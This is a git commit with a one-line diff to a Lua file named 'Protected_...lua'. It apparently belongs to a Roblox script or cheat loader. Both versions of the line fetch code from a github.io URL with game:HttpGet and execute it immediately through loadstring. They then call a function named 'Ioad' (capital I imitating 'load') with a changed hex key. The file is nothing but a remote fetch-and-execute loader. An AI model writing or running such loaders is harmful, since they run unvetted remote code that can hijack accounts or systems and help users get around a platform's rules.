7530bc85ec1b8e100d1f160d9b49719a18908751
Roman304010 <oxrimenko.r@yandex.ru>
2025-02-12 15:50:37 +0500

    Protected_5736407961643454.lua

--- Protected_5736407961643454.lua
+++ Protected_5736407961643454.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://ghostplayer352.github.io/Authorization/"))()Ioad("f9d4d2fbbf0111b207c3ae6ff5e0c9d6")
+loadstring(game:HttpGet("https://ghostplayer352.github.io/Authorization/"))()Ioad("44e1e5c6b3cc2c5756b4339dd22de83c")
